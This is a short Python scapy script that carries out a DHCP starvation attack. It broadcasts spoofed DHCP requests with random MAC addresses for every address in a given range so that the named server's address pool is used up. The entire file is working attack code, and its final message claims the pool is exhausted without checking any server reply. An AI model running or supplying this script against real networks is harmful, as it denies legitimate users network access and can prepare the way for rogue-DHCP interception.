import sys, ipaddress
from scapy.all import *

dhcp_server = sys.argv[1]
network_address = ipaddress.IPv4Network(sys.argv[2])

for ip in network_address:
  random_mac = RandMAC()
  request = (Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=random_mac) /
            DHCP(options=[("message-type", "request"), ("requested_addr", str(ip)), ("server_id", dhcp_server), "end"]))

  sendp(request, verbose=0)

print("Every addresses in the pool have been taken.")